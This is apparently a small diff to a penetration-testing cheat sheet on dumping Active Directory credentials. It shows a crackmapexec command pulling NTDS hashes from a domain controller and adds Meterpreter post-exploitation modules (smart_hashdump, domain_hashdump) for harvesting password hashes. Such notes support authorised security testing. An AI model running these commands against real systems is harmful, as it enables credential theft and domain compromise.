@@ -39,3 +39,12 @@ cat myhashes.ntds | grep -v "$:" | grep "status=Enabled" | cut -d'\' -f2 | cut -
 crackmapexec smb <DC-IP> -u <user> -p <password> --ntds
 ```
 
+## Meterpreter
+
+Once you have your Meterpreter shell from your exploit of choice, such as PSEXEC
+
+```
+run post/windows/gather/smart_hashdump
+--- or ---
+run post/windows/gather/credentials/domain_hashdump
+```
